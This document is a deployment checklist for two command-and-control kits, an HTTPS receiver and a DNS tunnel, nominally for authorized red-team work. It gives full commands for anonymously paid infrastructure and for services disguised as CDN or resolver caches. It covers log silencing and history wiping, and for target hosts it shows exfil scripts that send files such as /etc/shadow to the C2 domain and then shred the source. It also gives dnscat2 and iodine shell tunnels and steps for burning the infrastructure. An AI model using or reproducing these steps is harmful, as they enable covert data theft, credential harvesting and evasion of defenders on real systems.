# GHOST-HUNT // C2 KITS — DEPLOYMENT CHECKLIST

> **Scope:** HTTPS Receiver (`GHOST-HUNT-C2-KIT/`) + DNS Tunnel (`GHOST-HUNT-C2-KIT-DNS/`)
> **Status baseline:** Both kits PASSED local smoke tests (round-trip + cover 6/6), ruff lint (0 findings), pyright typecheck (0 errors) on 2026-08-10.
> **Measured capacity:** See `VALIDATION.md` — HTTPS 200 MB @ ~14 MB/s; DNS 64 KB / 1,748 queries, zero loss.
> **Use:** Authorized red team / adversary-emulation engagements only.

---

## 0. PRE-DEPLOYMENT GATE — run once per kit, on any dev box

| Gate | Command (from kit dir) | Required Result |
|---|---|---|
| HTTPS round-trip | `python test/local_harness.py` | `[PASS] round-trip OK … sha256 matches`, exit 0 |
| HTTPS cover self-test | `python test/local_harness.py --self-test-cover` | 6× `[PASS]`, exit 0 |
| DNS round-trip | `python test/local_dns_harness.py` | `[PASS] DNS round-trip OK … sha256 matches`, exit 0 |
| DNS cover self-test | `python test/local_dns_harness.py --self-test-cover` | 6× `[PASS]`, exit 0 |
| Ruff lint (both) | `python -m ruff check *.py test/ --config ../pyproject.toml` | `All checks passed!` |
| Pyright (both) | `python -m pyright *.py --pythonversion 3.6` | `0 errors, 0 warnings` |

> If `make` is available: `make test`, `make test-cover`, `make lint`, `make typecheck` run the same gates.
> **Do not proceed to §1/§3 until all gates are green.**

---

## 1. HTTPS KIT — DEPLOYMENT CHECKLIST

### 1.1 Pre-Stage (operator workstation)

- [ ] VPS: Ubuntu 22.04+, ≥1 GB RAM, public IP. **Anonymous payment (Monero VPS)** — no clean attribution.
- [ ] Domain: legit-looking `.com`/`.net` registered anonymously; **A record → VPS IP** (propagated, `dig +short <domain>`).
- [ ] Fresh Ed25519 SSH key: `ssh-keygen -t ed25519 -f /dev/shm/c2_key -N ""` — key-only auth.
- [ ] Fernet key: leave blank in env → auto-generated at deploy; **or** pre-generate with:
      `python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"`
- [ ] Whole kit dir copied to VPS (`handler.py` MUST sit next to `bootstrap-server.sh`).

### 1.2 server.env (copy from `server.env.example`)

| Var | Value | Notes |
|---|---|---|
| `DOMAIN` | `cdn-analytics-<random>.com` | A record must already point at this VPS |
| `EMAIL` | `admin@<domain>` | Let's Encrypt contact; avoid opsec leaks |
| `FERNET_KEY` | *(blank = auto-generate)* | Store offline after deploy |
| `ALLOW_SSH` | `yes` / `no` | `yes` keeps 22 open for operator pull; `no` = max lockdown |

### 1.3 Deploy (VPS, root)

- [ ] `cp server.env.example server.env` && set `DOMAIN` (+ optional `FERNET_KEY`)
- [ ] `bash bootstrap-server.sh server.env`
- [ ] Bootstrap performs & MUST succeed in order:
      1. **Firewall:** `ufw reset` → allow `80/tcp` (certbot HTTP-01 + renewal) → allow `443/tcp` → optional `22/tcp` → `ufw enable` → deny-all inbound
      2. **TLS:** nginx stopped → `certbot certonly --standalone -d $DOMAIN` (Let's Encrypt)
      3. **NGINX CDN-mimic:** `/health` = 200 `{"status":"ok"}`, `/static/` = static assets, `location /` = **404 on GET, POST → 127.0.0.1:8080**, `client_max_body_size 100M`, `access_log off`
      4. **Receiver:** `handler.py` → `/opt/c2/handler.py`, keyless (stores Fernet-encrypted slices), runs as `nobody`
      5. **systemd:** `cdn-cache.service` (masked as CDN cache), `Restart=always`, `ProtectSystem=strict`
      6. **OpSec:** history wiped, incoming dir `chmod 700 nobody:nogroup`
      7. **Self-test:** `GET /health` + encrypted POST round-trip → chunk lands in `/opt/c2/incoming/`
- [ ] **Banner captured:** `URL: https://<DOMAIN>` + `KEY: <FERNET_KEY>` + `STATUS: active`

### 1.4 Post-Deploy Verification

- [ ] `dig +short <DOMAIN>` → VPS IP
- [ ] `curl -sk https://<DOMAIN>/health` → `{"status":"ok"}`
- [ ] `curl -sk https://<DOMAIN>/` (GET) → **404** (mimic)
- [ ] `systemctl is-active cdn-cache` → `active`; `ss -ltnp | grep 8080` → listening
- [ ] Encrypted POST round-trip: `curl -sk -X POST https://<DOMAIN>/ --data-binary @/tmp/t.bin` → chunk file appears in `/opt/c2/incoming/`

### 1.5 Exfil (target host — Python 3.6+ + `cryptography`)

- [ ] `pip install cryptography`
- [ ] `C2_HOST=<DOMAIN> C2_KEY=<key-from-banner> python3 exfil.py /path/file.dat /path/other.db`
- [ ] Flags: `--keep` (lab only, keeps source), `--chunk-mb 4` (bigger chunks)
- [ ] Expected: chunks POSTed with `X-Chunk-ID`/`X-Chunk-Seq`, 2 retries each, source overwritten + deleted
- [ ] ⚠️ Test with `--keep` first on a dummy file before real payloads

### 1.6 Pull & Decrypt (operator workstation)

- [ ] `scp -i ~/.ssh/c2_key root@<VPS_IP>:/opt/c2/incoming/*.bin ./loot/`
- [ ] `C2_KEY=<key-from-banner> python3 pull.py --dir ./loot --out ./recovered`
- [ ] Expected: `recovered/<content-hash>.bin`, byte-identical to source
- [ ] Loss surfaced by Fernet auth (decrypt failure — no silent corruption) + seq-gap scan listing exact missing seqs (incl. seq 0)
- [ ] Pipelines that must never ingest an incomplete pull: add `--strict` → exit `2` when a gap warning or decrypt failure fires (default exit `0` keeps other files pullable for triage)

### 1.7 Burn (VPS, root — only after data verified + pulled)

- [ ] `bash burn.sh <DOMAIN>`
- [ ] Verify burn output shows:
      - ☐ handler: `cdn-cache inactive`
      - ☐ incoming: `0 files remain`
      - ☐ nginx: no `c2` site in `sites-enabled`
      - ☐ certs: 0 Let's Encrypt certs remain
- [ ] **Final:** terminate the VPS from the provider panel; revoke SSH key; never reuse domain/Fernet key

---

## 2. HTTPS KIT — TLS CONFIG REFERENCE

| Setting | Value |
|---|---|
| Cert | Let's Encrypt (HTTP-01 standalone) → `/etc/letsencrypt/live/$DOMAIN/` |
| Protocols | `TLSv1.2 TLSv1.3` |
| Ciphers | `HIGH:!aNULL:!MD5` |
| Front | nginx :443 (HTTP/2) → `proxy_pass http://127.0.0.1:8080` |
| Client body | `100M` max |
| Logging | `access_log off; error_log /dev/null` (silent) |

---

## 3. DNS KIT — DEPLOYMENT CHECKLIST

### 3.1 Pre-Stage (operator workstation)

- [ ] VPS: static IP, UDP 53 reachable (any OS with Ruby), anonymous (Njalla / Monero)
- [ ] Domain: full control, anonymous registration
- [ ] **NS glue records** at registrar — MUST be set BEFORE deploy:
      `ns1.<DOMAIN> → VPS IP`, `ns2.<DOMAIN> → VPS IP`
- [ ] Shared secret: `pwgen -s 48 1` (Method B XOR key + Method C iodine `-P`)

### 3.2 server-dns.env (copy from `server-dns.env.example`)

| Var | Value | Notes |
|---|---|---|
| `DOMAIN` | `cdn-cache-<random>.com` | Authoritative on this VPS; NS glue already set |
| `PORT` | `53` | 53 = standard authoritative DNS (use for real ops) |
| `PASSWORD` | *(48-char random)* | XOR key derivation + iodine |

### 3.3 Deploy (VPS, root)

- [ ] `cp server-dns.env.example server-dns.env` && set `DOMAIN` (+ optional `PASSWORD`)
- [ ] `bash bootstrap-dns-server.sh server-dns.env`
- [ ] Bootstrap performs & MUST succeed in order:
      1. **Packages:** ruby, ruby-dev, build-essential, ufw; `gem install dnscat2` (binary resolved via `command -v` + `/var/lib/gems` fallback)
      2. **Firewall:** allow `53/udp` + `53/tcp` → `ufw enable` → deny-all inbound
      3. **systemd:** `dns-c2.service` masked as "DNS Resolver Cache", `dnscat2 --dns "domain=$DOMAIN,host=0.0.0.0,port=$PORT" --security=open --no-cache` (must run as root — UDP/53 privileged)
      4. **OpSec:** history wiped
- [ ] **Banner captured:** `DOMAIN`, `IP`, `STATUS: active`

### 3.4 Post-Deploy Verification

- [ ] `dig @<VPS-IP> TXT test.<DOMAIN>` → **reaches dnscat2** (expected NXDOMAIN/empty = fine, query logged)
- [ ] `dig +short <DOMAIN> NS` → shows `ns1/ns2.<DOMAIN>`
- [ ] `systemctl is-active dns-c2` → `active`; `ss -ulpn | grep :53` → bound
- [ ] Nothing else binds UDP 53: `ss -ulpn` (systemd-resolved must be disabled/configured away)

### 3.5 Exfil — 3 methods

- [ ] **Method B (recommended — stdlib only, no installs):**
      `python3 dns_exfil.py --domain <DOMAIN> --password <secret> /etc/shadow`
      - `--jitter 1.0` default (1–5s); `--chunk 40` (max 60 — DNS label cap 63, total < 255); `--keep` = no shred
      - TXT query shape: `<base32-chunk>.x<seq>.<fileid>.<DOMAIN>`; NXDOMAIN expected + ignored
      - Multiple files: `dns_exfil.py a b c` (16-hex `fileid` = content hash keeps files distinct)
- [ ] **Method A (dnscat2 full tunnel):** `./dnscat2 <DOMAIN>` → `shell` → `session -i 1`
- [ ] **Method C (iodine IP-over-DNS):** server `iodined -f -P "<secret>" -c 10.0.0.1 <DOMAIN>`; client `iodine -f -P "<secret>" <DOMAIN>` → `ssh -D 1080 user@10.0.0.1`

### 3.6 Capture & Pull (operator workstation)

- [ ] Capture: dnscat2 session log **or** tcpdump of QNAME → extract chunk label + fileid label → `chunk_<fileid>_<seq>.txt`
- [ ] `DNS_PASSWORD=<secret> python3 dns_pull.py --dir <capture-dir> --out recovered`
- [ ] Expected: one `recovered/<fileid>.bin` per file; loss surfaced by BOTH warnings:
      ☐ seq-gap warning lists exact missing seqs (incl. seq 0)
      ☐ `INTEGRITY FAILED` content-hash mismatch (catches tail loss + wrong password)
- [ ] Pipelines that must never ingest corrupt data: add `--strict` → exit `2` when either warning fires (default exit `0` keeps partial data for triage)
- [ ] ⚠️ **Version lock:** `dns_exfil.py` / `dns_handler.py` / `dns_pull.py` must be upgraded as a set (old puller skips `chunk_<fileid>_<seq>.txt` as malformed). The integrity check is puller-side-only (no wire-format change) — backward compatible with existing captures

### 3.7 Burn (VPS, root — after operation complete)

- [ ] `bash burn-dns.sh`
- [ ] Verify burn output:
      - ☐ service: `dns-c2 inactive`
      - ☐ unit: `removed`
- [ ] **Final:** let domain expire / transfer to burner registrar; terminate VPS; never reuse domain/secret

---

## 4. CHANNEL SELECTION (decision matrix)

| Scenario | Channel | Why | Measured rate* |
|---|---|---|---|
| Target has no tools, DNS-only egress | **DNS Method B** | Paper-thin footprint | ~0.65 KB/s @ 0.01s jitter |
| High-security environment | **DNS Method B**, tight jitter (2–5s) | Lowest detection profile | ~0.2–1 q/s (jitter-bound) |
| Full interactive tunnel | DNS Method A (dnscat2) / C (iodine) | Shell through DNS | n/a (tunnel) |
| Fast, high-bandwidth exfil | **HTTPS kit** | TLS, nginx front, multi-chunk | ~14 MB/s (4 MB chunks) |

> *Measured on localhost harness — see `VALIDATION.md` §2–3 for full test matrix and reproduction commands.

---

## 5. OP-SEC CHECKLIST (both kits)

- [ ] VPS paid anonymously (Monero); domain registered anonymously
- [ ] Fresh encryption key/secret per operation — **never reused**; stored offline only
- [ ] No attribution: fake-but-legit `EMAIL`, CDN/resolver service masking names
- [ ] Handler/nginx logging silent (`access_log off`)
- [ ] Burn rehearsed BEFORE deployment; data verified + pulled before burn
- [ ] Burn closes firewall ports, wipes history, terminates VPS
- [ ] ROE / written authorization on file covering infra + target

---

> `[OP-ID: DEP-CHECKLIST-C2]` | `[PHASE]: III — WEAPONIZATION VALIDATION` | `[STATUS]: ARMED — GATES GREEN`

> **[CONCLUSION]:** Both kits cleared every pre-deployment gate (smoke, cover, lint, typecheck). This checklist is the single reference for staging → deploy → verify → exfil → pull → burn on both the HTTPS receiver and the DNS tunnel. 🚬

*END DEPLOYMENT CHECKLIST*
